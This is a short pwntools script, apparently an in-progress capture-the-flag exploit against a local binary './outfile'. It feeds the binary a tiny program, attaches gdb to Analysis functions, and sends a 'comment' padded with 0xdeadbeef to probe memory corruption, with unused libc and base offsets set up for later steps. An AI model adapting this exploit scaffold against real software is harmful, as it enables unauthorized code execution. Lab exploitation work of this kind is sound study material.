#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './outfile'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

payload = '''begin
function
function
var b = 1;
end'''

lines = payload.split('\n')
print(lines)
for i in lines:
    io.recvuntil(">")
    io.sendline(i)
gdb.attach(io, '''
break Analysis::StartAnalysis()
b Analysis::C(std::_List_iterator<SymInfo>)
b Analysis::A(std::_List_iterator<SymInfo>)
b Analysis::H(std::_List_iterator<SymInfo>)
b Analysis::dumpVar(std::ostream&)
''')
io.sendline('OVER')
io.recvuntil("size")
io.sendline(str(0x50))
io.recvuntil("comment:")
io.sendline(p64(0xdeadbeef) * 10)








io.interactive()
